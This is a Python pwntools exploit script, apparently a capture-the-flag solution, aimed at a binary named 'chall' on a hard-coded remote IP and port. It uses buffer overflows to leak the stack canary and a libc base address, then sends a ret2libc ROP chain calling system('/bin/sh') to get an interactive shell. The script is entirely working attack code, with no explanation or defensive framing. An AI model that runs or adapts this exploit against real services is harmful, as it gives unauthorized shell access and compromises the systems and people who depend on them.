from pwn import *

exe = './chall'

(host,port_num) = ("91.107.254.175",5000)
context.log_level = "DEBUG"
context.aslr = False

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(
            [exe] + argv, gdbscript=gscpt, *a, **kw)
    elif args.RE:
        return remote(host,port_num)
    else:
        return process( 
            [exe] + argv, *a, **kw)
    
gscpt = (
    '''
b * 0x00055555555555F
'''
).format(**locals())

context.update(arch='amd64')

# SHORTHANDS FOR FNCS
def se(nbytes)      : return p.send(nbytes)
def sl(nbytes)      : return p.sendline(nbytes)
def sa(msg,nbytes)  : return p.sendafter(msg,nbytes)
def sla(msg,nbytes) : return p.sendlineafter(msg,nbytes)
def rv(nbytes)      : return p.recv(nbytes)
def rvu(msg)        : return p.recvuntil(msg)
def rvl()           : return p.recvline()

# _____________________________________________________ #
# <<<<<<<<<<<<<<< EXPLOIT STARTS HERE >>>>>>>>>>>>>>>>> #

p = start()

sla(b"bet value: ",b"1001")
sla(b"guess: ",b"0")

payload = 0x800*b"a" + b"deadbeef"
sla(b"round: ",payload)
rvu("deadbeef\n")
canary = u64(b"\x00" + rv(7))
print("CANARY OBTAINED AS -",hex(canary))

sla(b"value: ",b"1717921122")
sla(b"guess: ",b"0")
sla(b"value: ",b"1")
sla(b"guess: ",b"0")

payload = 0x816*b"a" + b">>"
sa(b"round: ",payload)
rvu(b">>")
libc = u64(rv(6).ljust(8,b"\x00"))

print("LIBC LEAK OBTAINED -",hex(libc))
sla(b"value: ",b"1633771873")
sla(b"guess: ",b"0")
sla(b"value: ",b"1")
sla(b"guess: ",b"0")

payload = 0x816*b"a" + b">>"
sa(b"round: ",payload)
rvu(b">>")
libc = u64(rv(6).ljust(8,b"\x00")) - 0x29d90

binsh  = libc + 0x1d8698
system = libc + 0x50d70
poprdi = libc + 0x2a3e5
ret    = libc + 0xfa07d

payload = 0x808*b"\x00" + p64(canary) + p64(0x0) + p64(poprdi) + p64(binsh) + p64(ret) + p64(system)
sla(b"value: ",b"1633771873")
sla(b"guess: ",b"0")
sla(b"value: ",b"1")
sla(b"guess: ",b"0")
sla("this round: ",payload)

p.interactive()